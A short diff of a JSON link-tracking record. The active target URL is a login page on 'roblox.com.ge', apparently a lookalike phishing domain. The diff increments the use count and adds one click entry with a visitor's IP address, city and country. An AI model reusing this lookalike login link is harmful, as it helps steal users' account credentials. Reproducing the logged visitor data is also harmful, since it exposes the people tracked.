@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1043,
+    "useCount": 1044,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8464,6 +8464,14 @@
         "city": "Huánuco",
         "flag": "🇵🇪",
         "countryCode": "PE"
+      },
+      {
+        "timestamp": 1777234934869,
+        "ip": "217.136.137.102",
+        "country": "Belgium",
+        "city": "Brussels",
+        "flag": "🇧🇪",
+        "countryCode": "BE"
       }
     ]
   },
